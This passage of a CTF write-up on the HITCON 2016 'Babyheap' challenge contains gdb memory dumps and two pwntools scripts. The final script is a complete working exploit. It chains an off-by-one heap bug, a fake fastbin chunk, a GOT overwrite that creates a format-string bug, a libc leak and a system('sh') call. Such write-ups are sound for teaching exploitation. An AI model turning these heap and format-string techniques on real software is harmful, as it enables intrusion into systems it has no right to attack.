      0x7ff57caa3000     0x7ff57cc63000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57cc63000     0x7ff57ce63000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce63000     0x7ff57ce67000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce67000     0x7ff57ce69000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce69000     0x7ff57ce6d000     0x4000        0x0 
      0x7ff57ce6d000     0x7ff57ce93000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d06f000     0x7ff57d072000     0x3000        0x0 
      0x7ff57d090000     0x7ff57d092000     0x2000        0x0 
      0x7ff57d092000     0x7ff57d093000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d093000     0x7ff57d094000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d094000     0x7ff57d095000     0x1000        0x0 
      0x7fff44cc6000     0x7fff44ce7000    0x21000        0x0 [stack]
      0x7fff44dac000     0x7fff44dae000     0x2000        0x0 [vvar]
      0x7fff44dae000     0x7fff44db0000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ ni

0x0000000000400d3f in ?? ()
gdb-peda$ info proc map
process 103665
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
           0x20e7000          0x2109000    0x22000        0x0 [heap]
      0x7ff57caa3000     0x7ff57cc63000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57cc63000     0x7ff57ce63000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce63000     0x7ff57ce67000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce67000     0x7ff57ce69000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce69000     0x7ff57ce6d000     0x4000        0x0 
      0x7ff57ce6d000     0x7ff57ce93000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d06f000     0x7ff57d072000     0x3000        0x0 
      0x7ff57d090000     0x7ff57d092000     0x2000        0x0 
      0x7ff57d092000     0x7ff57d093000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d093000     0x7ff57d094000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d094000     0x7ff57d095000     0x1000        0x0 
      0x7fff44cc6000     0x7fff44ce7000    0x21000        0x0 [stack]
      0x7fff44dac000     0x7fff44dae000     0x2000        0x0 [vvar]
      0x7fff44dae000     0x7fff44db0000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ x/2gx 0x20e7000
0x20e7000:	0x0000000000000000	0x0000000000001011
gdb-peda$ x/10gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000020ff1
0x20e8020:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **You can check the change in “content->content” as follows.**
  + For analysis, set the break point as follows.

```sh title="Breakpoint setting"
gdb-peda$ b *0x400ADD 
Breakpoint 2 at 0x400add
gdb-peda$ c
Continuing.
```

```sh title="p.interactive()"
[*] Switching to interactive mode
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ 1
Size :$ 32
Content:$ BBBB
Name:$ CCCCCCCC
$
```

* **The value of content->content is changed as follows.**  
  + The heap area for “gData” is allocated after the heap area used in scanf().
  + The heap area for “content->content” has been allocated after the heap area of ​​“gData”.
* **What is important is the value stored in “content->content”.**
  + The value stored in "content→content" (0x20e8030) is 0x20e8040.
  + In other words, “0x30” can be changed to “0x00” by an Off-by-One Error.
    - 0x20e8030 → 0x20e8000

```sh title="p.interactive() - after off-by-one"
Breakpoint 2, 0x0000000000400add in ?? ()
gdb-peda$ x/10gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x0000000000000000
gdb-peda$ x/20gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x0000000000000000
0x20e8030:	0x00000000020e8040	0x0000000000000031
0x20e8040:	0x0000000a42424242	0x0000000000000000
0x20e8050:	0x0000000000000000	0x0000000000000000
0x20e8060:	0x0000000000000000	0x0000000000020fa1
0x20e8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ ni
0x0000000000400ae2 in ?? ()
gdb-peda$ x/20gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x4343434343434343
0x20e8030:	0x00000000020e8000	0x0000000000000031
0x20e8040:	0x0000000a42424242	0x0000000000000000
0x20e8050:	0x0000000000000000	0x0000000000000000
0x20e8060:	0x0000000000000000	0x0000000000020fa1
0x20e8070:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* We call the "Delete" function like this:

```sh title="p.interactive() - delete"
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ 2
```

* **You can check that the Fake chunk is registered in fastbin as follows.**
  + fastbinsY[0] : gData(0x20e8010)
  + fastbinsY[5] : Fake chunk(0x20e7ff0)

```sh title="p.interactive() - fastbin"
^C
Program received signal SIGINT, Interrupt.
0x00007ff57cbba55c in __read_chk (fd=0x0, buf=0x7fff44ce4270, nbytes=0x10, buflen=<optimized out>) at read_chk.c:33
33	in read_chk.c
gdb-peda$ p main_arena.fastbinsY[0]
$2 = (mfastbinptr) 0x20e8010
gdb-peda$ p main_arena.fastbinsY[5]
$3 = (mfastbinptr) 0x20e7ff0
gdb-peda$
```

* **You can allocate the fastbinsY[5] area in the following way.**
  + Use the "1. New" function and enter 0x60(96) as the value for "Size:".
  + Reallocate the fastbinsY[5] area by the malloc() function.
  + The fastbinsY[0] area is reallocated to “gData”.
* **In other words, it is possible to overflow the contents of the gData structure variable by exploiting the UAF vulnerability.**
  + In the "ptr→content" area, the attacker can store the address value where he or she wants to store the value.
  + You can use the "3. Edit" function to save the desired value to the address saved in the ptr→content area.

#### **Create FSB vulnerability**

* **In order to obtain a shell in this problem, libc addresses, an address value that can change the flow of the program, are required.**
* **To solve this problem, you can create an FSB vulnerability.**
* **FSB vulnerabilities can be created in the following ways:**
  + Store the plt address value of the printf() function in the GOT area of ​​the atoi() function.
  + When only the plt address value of the printf() function is passed, the Lline feed (0x0000000A) value is stored in the GOT area of ​​the \_\_isoc99\_scanf() function.  
    - This causes an Error to occur.
  + To resolve the error, save the “PLT address of printf()” and “PLT address of \_\_isoc99\_scanf()” together.
* **The reasons for changing the atoi() function to the prinf() function are as follows:**
  + Type of argument passed
  + In the case of the printf() function, it returns the number of printed characters.
    - In other words, you can call a function using the length of the string.
* The script code is as follows:

```python title="babyheap-attack.py"
from pwn import *

context.log_level = 'debug'

binary = ELF('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

got_atoi = binary.got['atoi']
plt_printf = binary.symbols['printf']
plt_scanf = binary.symbols['__isoc99_scanf']

def NewFunction(size,content,name):
	p.recvuntil('Your choice:')
	p.sendline('1')
	p.recvuntil('Size :')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
	p.recvuntil('Name:')
	p.sendline(name)

def DeleteFunction():
	p.recvuntil('Your choice:')
	p.sendline('2')

def EditFunction(content):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Content:')
	p.sendline(content)

def ExitFunction(answer):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Really? (Y/n)')
	p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

log.info("GOT atoi() : " + hex(got_atoi))
log.info("PLT printf() : " + hex(plt_printf))
log.info("PLT scanf() : " + hex(plt_scanf))

#Save Fake chunk
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
ExitFunction(fakechunk)

#Off-by-One Error
NewFunction(32,'BBBB','OffbyOne')
DeleteFunction()

#Overflow ptr->content to atio() GOT
overflow = p64(0) * 4
overflow += p64(0x80)
overflow += 'A' * 8
overflow += p64(got_atoi)
NewFunction(96,overflow,"CCCC")

#Overlfow atio() GOT to printf() PLT + scanf() PLT
EditFunction(p64(plt_printf) + p64(plt_scanf))

p.interactive()
```

* **The following is the result of running the script.**

```sh title="result"
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ python Exploit.py 
[*] '/home/autolycos/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
    FORTIFY:  Enabled
[+] Starting local process './babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b': Done
[*] GOT atoi() : 0x602078
[*] PLT printf() : 0x400780
[*] PLT scanf() : 0x400800
[*] Switching to interactive mode
Done!
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$
```

### Leaklibcaddresss

* **You can extract libcaddresses using the FSB vulnerability as follows.**
  + The first value (0x7fff5adbd6e0) is the address of the stack area.
  + The third value (0x7fef49664cdc) is the address of the Libc area.

```sh title="FSB 취약성을 이용해 출력된 Stack에 저장된 값"
[*] Switching to interactive mode
Done!
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ %p%p%p%p%p%p%p
0x7fff5adbd6e00x100x7fef49664cdc0x7fef49b227000xc0x400e360x7fef495bd73a
Invalid choice !
```

### Reset the "gEditState" value

* **After creating the FSB vulnerability using the script written previously, we proceed with the analysis.**
  + Set a break point in the 0x400948 area.

```sh title="Breakpoint setting"
gdb-peda$ b *0x400948
Breakpoint 1 at 0x400948
gdb-peda$ c
Continuing.
```

* **You can change the value of “gEditState” in the following ways.**
  + By exploiting a vulnerability in the UserInput() function, 16 characters can be stored in the Stack.
  + In other words, if you know the location of the value entered by the user using the FSB vulnerability, you can change the value of "gEditState" to 0.
* **If you enter "%8$p" as follows, "0xa70243825" will be output.**
  + The output "0xa70243825" is the hex value of the "%8$p" string entered by the user.
  + The %8 area is the “nptr” variable area, and the %9 area is where the basic address of the local variable is stored.
  + That is, if you store "%9$nAAAA" + p64 (address of gEditState) as the input value of "Your choice:$", the value of the "gEditState" global variable will be changed to 0 by the FSB vulnerability.

```sh title="p.interactive() - leak gEditState address"
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ %8$p
$ 0xa70243825
```

```sh title="%8p area"
Breakpoint 1, 0x0000000000400948 in ?? ()
gdb-peda$ i r rsi
rsi            0x7ffea3212fa0	0x7ffea3212fa0
gdb-peda$ x/4gx 0x7ffea3212fa0
0x7ffea3212fa0:	0x0000000000000000	0x00007ffea3212fc0
0x7ffea3212fb0:	0x0000000000400820	0x8e40fe9595c66800
gdb-peda$
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

context.log_level = 'debug'

binary = ELF('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

got_atoi = binary.got['atoi']
plt_printf = binary.symbols['printf']
plt_scanf = binary.symbols['__isoc99_scanf']
editCount = 0x6020a4

system = libc.symbols['system']
 
def NewFunction(size,content,name):
	p.recvuntil('Your choice:')
	p.sendline('1')
	p.recvuntil('Size :')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
	p.recvuntil('Name:')
	p.sendline(name)

def DeleteFunction():
	p.recvuntil('Your choice:')
	p.sendline('2')

def EditFunction(content):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Content:')
	p.sendline(content)

def ExitFunction(answer):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Really? (Y/n)')
	p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

log.info("GOT atoi() : " + hex(got_atoi))
log.info("PLT printf() : " + hex(plt_printf))
log.info("PLT scanf() : " + hex(plt_scanf))

#Save Fake chunk
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
ExitFunction(fakechunk)

#Off-by-One Error
NewFunction(32,'BBBB','OffbyOne')
DeleteFunction()

#Overflow ptr->content to atio() GOT
overflow = p64(0) * 4
overflow += p64(0x80)
overflow += 'A' * 8
overflow += p64(got_atoi)
NewFunction(96,overflow,"CCCC")

#Overlfow atio() GOT: atoi() PLT -> printf() PLT + scanf() PLT
EditFunction(p64(plt_printf) + p64(plt_scanf))

#Leak Libc addresss
p.recvuntil('Your choice:')
p.sendline('%3$p')
tmp = p.recvuntil('\nInvalid choice')[:14]
leakLibcAddresss = int(tmp,16)
baseLibcAddresss = leakLibcAddresss - 0x116cdc
libcSystem = baseLibcAddresss + system

log.info('Leak Libc Addresss : ' + hex(leakLibcAddresss))
log.info("Base Libc Addresss : " + hex(baseLibcAddresss))
log.info('Libc system() : ' + hex(libcSystem))

#Change the value of "gEditState"
p.recvuntil(':')
p.send("%9$nAAAA"+ p64(editCount))

#Call the Edit function
p.recvuntil(':')
p.sendline('HH')

#atoi() GOT: printf() plt -> system addresss
p.recvuntil(':')
p.sendline(p64(libcSystem))

p.sendline('sh')
p.interactive()
```

:::Note
* Because the GOT value of the atoi() function has been changed to the PLT of the printf() function, the menu function cannot be used with a numeric value as input.
  + The number of characters must be used.
  + To call menu number 1, press Enter
  + Menu call number 2 requires 1 character
  + Menu call number 3 requires 2 letters
  + Menu number 4 call requires 3 letters
:::

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Babyheap-Pwn-300>
* <https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/babyheap.py>